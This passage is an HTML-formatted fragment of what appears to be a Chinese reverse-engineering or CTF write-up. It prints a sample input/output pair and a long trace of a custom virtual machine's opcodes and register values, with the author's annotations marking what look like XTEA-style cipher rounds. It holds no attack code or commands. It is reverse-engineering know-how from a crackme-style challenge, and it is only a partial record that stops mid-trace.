class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">输入：<span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">32</span> <span class="number">32</span> <span class="number">32</span> <span class="number">32</span></span><br><span class="line">输出：ec <span class="number">9</span>d <span class="number">57</span> <span class="number">67</span> <span class="number">94</span> <span class="number">6</span>a <span class="number">7</span>e a5</span><br><span class="line"></span><br><span class="line">======以下是打印的日志</span><br><span class="line">OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x1</span> + pFlag[<span class="number">22</span>]:<span class="number">0x13</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">20</span>] = <span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">15</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0x14</span>, pFlag[<span class="number">21</span>]:<span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x14</span> - pFlag[<span class="number">21</span>]:<span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x2</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x2</span> + pFlag[<span class="number">22</span>]:<span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">19</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">15</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0x2</span>, pFlag[<span class="number">21</span>]:<span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x2</span> - pFlag[<span class="number">21</span>]:<span class="number">0xa</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0</span>, pFlag[<span class="number">21</span>]:<span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> - pFlag[<span class="number">21</span>]:<span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">16</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0</span> + pFlag[<span class="number">22</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x31313131</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">12</span>] = <span class="number">0x31313131</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x1</span> + pFlag[<span class="number">22</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0</span> + pFlag[<span class="number">22</span>]:<span class="number">0x3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">13</span>] = <span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x31313131</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x10</span></span><br><span class="line">------&gt;OPCODE :<span class="number">2</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x10</span> * pFlag[<span class="number">23</span>]:<span class="number">0x32323232</span>;   ====</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">25</span>]:<span class="number">0x32323232</span>, pFlag[<span class="number">24</span>]:<span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">3</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x32323232</span> / pFlag[<span class="number">24</span>]:<span class="number">0x20</span>;  ====</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x1919191</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0x23232320</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x32323232</span>;     ====</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x32323232</span> + pFlag[<span class="number">23</span>]:<span class="number">0x22b2b2b1</span>;  ====</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xce0a6e55</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xce0a6e55</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x3</span></span><br><span class="line">------&gt;OPCODE :<span class="number">5</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x3</span> &amp; pFlag[<span class="number">25</span>]:<span class="number">0xce0a6e55</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0xe</span> + pFlag[<span class="number">25</span>]:<span class="number">0x1</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x6f76</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x6f76</span> + pFlag[<span class="number">24</span>]:<span class="number">0xce0a6e55</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0xce0addcb</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0x54e4e4e3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x9aee3928</span> + pFlag[<span class="number">22</span>]:<span class="number">0x31313131</span>;  ===</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">12</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xce0a6e55</span>; ===上一轮循环剩下的</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xa</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x75bcd15</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x75bcd15</span> + pFlag[<span class="number">22</span>]:<span class="number">0xce0a6e55</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">11</span>] = <span class="number">0xd5663b6a</span>;====</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0x10</span></span><br><span class="line">------&gt;OPCODE :<span class="number">2</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0x10</span> * pFlag[<span class="number">23</span>]:<span class="number">0xcc1f6a59</span>; ===</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">25</span>]:<span class="number">0xcc1f6a59</span>, pFlag[<span class="number">24</span>]:<span class="number">0x20</span></span><br><span class="line">------&gt;OPCODE :<span class="number">3</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0xcc1f6a59</span> / pFlag[<span class="number">24</span>]:<span class="number">0x20</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0xfe60fb53</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0xc1f6a590</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0xcc1f6a59</span> + pFlag[<span class="number">23</span>]:<span class="number">0x3f965ec3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">24</span>] = <span class="number">0xd5663b6a</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xb</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0xd5663b6a</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x800</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">26</span>]:<span class="number">0xd5663b6a</span>, pFlag[<span class="number">25</span>]:<span class="number">0x800</span></span><br><span class="line">------&gt;OPCODE :<span class="number">3</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0xd5663b6a</span> / pFlag[<span class="number">25</span>]:<span class="number">0x800</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0x3</span></span><br><span class="line">------&gt;OPCODE :<span class="number">5</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0x3</span> &amp; pFlag[<span class="number">25</span>]:<span class="number">0xfffaacc8</span>; ====</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">26</span>] = <span class="number">0xe</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">25</span>] = pFlag[<span class="number">26</span>]:<span class="number">0xe</span> + pFlag[<span class="number">25</span>]:<span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">25</span>] = <span class="number">0x494c</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">24</span>] = pFlag[<span class="number">25</span>]:<span class="number">0x494c</span> + pFlag[<span class="number">24</span>]:<span class="number">0xd5663b6a</span>;===</span><br><span class="line">------&gt;OPCODE :<span class="number">7</span></span><br><span class="line">pFlag[<span class="number">23</span>] = pFlag[<span class="number">24</span>]:<span class="number">0xd56684b6</span> ^ pFlag[<span class="number">23</span>]:<span class="number">0xbb5c91c</span>; ===</span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0xded34daa</span> + pFlag[<span class="number">22</span>]:<span class="number">0x32323232</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">13</span>] = <span class="number">0x11057fdc</span>; === </span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> + pFlag[<span class="number">21</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xc</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">2</span>] = <span class="number">0xcc1f6a59</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x13</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x1</span> + pFlag[<span class="number">21</span>]:<span class="number">0x2</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0</span> + pFlag[<span class="number">21</span>]:<span class="number">0x3</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0xd</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">3</span>] = <span class="number">0x11057fdc</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">18</span>  =============================================v13准备开始</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x13</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">23</span>] = <span class="number">0x1</span></span><br><span class="line">------&gt;OPCODE :<span class="number">0</span></span><br><span class="line">pFlag[<span class="number">22</span>] = pFlag[<span class="number">23</span>]:<span class="number">0x1</span> + pFlag[<span class="number">22</span>]:<span class="number">0x13</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">8</span></span><br><span class="line">pFlag[<span class="number">20</span>] = <span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">15</span></span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">9</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">14</span></span><br><span class="line">pFlag[<span class="number">22</span>] = <span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">12</span></span><br><span class="line">exchange pFlag[<span class="number">22</span>]:<span class="number">0x14</span>, pFlag[<span class="number">21</span>]:<span class="number">0x14</span></span><br><span class="line">------&gt;OPCODE :<span class="number">1</span></span><br><span class="line">pFlag[<span class="number">21</span>] = pFlag[<span class="number">22</span>]:<span class="number">0x14</span> - pFlag[<span class="number">21</span>]:<span class="number">0x14</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">11</span></span><br><span class="line">pFlag[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">------&gt;OPCODE :<span class="number">10</span></span><br><span class="line">pFlag[<span 